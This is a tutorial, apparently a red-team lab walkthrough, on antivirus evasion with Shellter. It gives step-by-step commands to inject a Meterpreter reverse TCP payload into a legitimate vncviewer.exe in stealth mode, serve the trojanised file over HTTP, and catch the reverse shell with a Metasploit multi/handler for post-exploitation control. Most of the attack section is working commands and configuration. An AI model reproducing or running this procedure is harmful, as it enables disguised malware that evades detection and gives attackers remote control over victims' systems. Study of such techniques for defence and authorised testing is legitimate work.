## AV Evasion With Shellter

### Defense Evasion

Defense Evasion consists of techniques that adversaries use to avoid detection thoroughout their compromise. Techiques used for defense evasion include uninstalling/disabling security software or **obfuscating/encrypting** data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. -MITRE 

### AV Detection Methods

AV software will typically utilize signature, heuristic and behaviour based detection.

1. Signature based detection - An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database.

We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature.

2. Heuristic-based detection - Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns withing the code or program calls.
3. Behaviour based detection - Relies on identifying malware by monitoring it's behaviour (Used for newer strains of malware).

### AV Evasion Techniques

**On-disk Evasion Techniques**
- Obfuscation - Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE.
- Encoding - Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format.
- Packing - Generate executable with new binary structure with a smaller size and therefore provides the payload with a new signature.
- Crypters - Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub

**In-Memory Evasion Techniques**
- Focuses on manipulation of memory and does not write files to disk.
- Injects payload into a process by leveraging various Windows APIs.
- Payload is then executed in memory in a seperate thread.

### Step-by-Step Process

### Step 1: Installing Shellter and Wine32

Before we begin, we need to install **Shellter** and the **Wine32** package to support the execution of Windows programs on **Kali Linux**.

Install **Shellter**:

```bash
sudo apt-get install shellter -y
```

Enable support for 32-bit architecture:

```bash
sudo dpkg --add-architecture i386
```

Install **Wine32**:

```bash
sudo apt-get install wine32
```

### Step 2: Copy the Executable File

We need a legitimate Windows executable file to inject our payload into. In this case, we use **vncviewer.exe**, which can be found in the following directory:

```bash
cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass/
```

### Step 3: Starting Shellter

Navigate to the **Shellter** directory and run **Shellter** using **Wine**:

```bash
cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```

### Step 4: Configuring Shellter

When **Shellter** starts, it will ask for the **mode** you want to use. We will use **Automatic Mode** by entering `A` for automatic:

```bash
A
```

Next, provide the **path** to the executable file you want to inject the payload into:

```bash
/home/kali/Desktop/AVBypass/vncviewer.exe
```

Enable **Stealth Mode** to bypass AV detection:

```bash
y
```

Choose the type of payload injection. We will select **L** for a **list of payloads**:

```bash
L
```

Choose payload `1`, which is a **Meterpreter reverse TCP payload**.

### Step 5: Setting Payload Options

Now, set the **LHOST** (your attacker's IP address, typically your Kali machine's IP address) and **LPORT** (the port on which you want to receive the connection):

- Set **LHOST** to your network interface, in this case, **eth1**.
- Set **LPORT** to 1234.

### Step 6: Starting the HTTP Server

Next, we need to serve the payload to the target. Set up a **Python web server** to serve the file:

Open a new terminal tab:

```bash
cd ~/Desktop/AVBypass
sudo python3 -m http.server 80
```

This will serve the **vncviewer.exe** payload from the **AVBypass** directory on port **80**.

### Step 7: Setting Up the Metasploit Handler

Go back to the terminal where **Metasploit** is running. We need to set up a **reverse shell handler** to catch the connection from the target system when the payload is executed.

Start **Metasploit**:

```bash
msfconsole
```

Use the **multi/handler** module to set up a reverse shell handler:

```bash
use multi/handler
```

Set the payload to match the one you selected in **Shellter**:

```bash
set payload windows/meterpreter/reverse_tcp
```

Set the **LHOST** and **LPORT** to the same values used in **Shellter**:

```bash
set lhost eth1
set lport 1234
```

Run the handler:

```bash
run
```

### Step 8: Executing the Payload on the Target

Now, transfer the **vncviewer.exe** file to the target system and execute it. Once executed, the **reverse shell** will connect back to your **Kali** machine, and you will gain a **Meterpreter session**.

### Step 9: Post-Exploitation

Once the payload is executed, you will receive a **Meterpreter session** on your **Kali** machine. You can verify this by checking the session in **Metasploit**:

```bash
sessions
```

Interact with the session:

```bash
sessions -i [sessionID]
```

You now have control over the target system and can perform further post-exploitation tasks.

### Conclusion

What we accomplished:
- Used **Shellter** to inject a **Meterpreter reverse TCP** payload into a legitimate **vncviewer.exe** file.
- Configured **Shellter** in **Stealth Mode** to bypass AV detection.
- Set up a **Metasploit** handler to catch the reverse shell connection.
- Successfully executed the payload on the target system and gained a **Meterpreter session**.

This demo demonstrates how to evade antivirus software using **Shellter** to inject malicious payloads into legitimate executables, allowing you to establish a reverse shell on the target system.
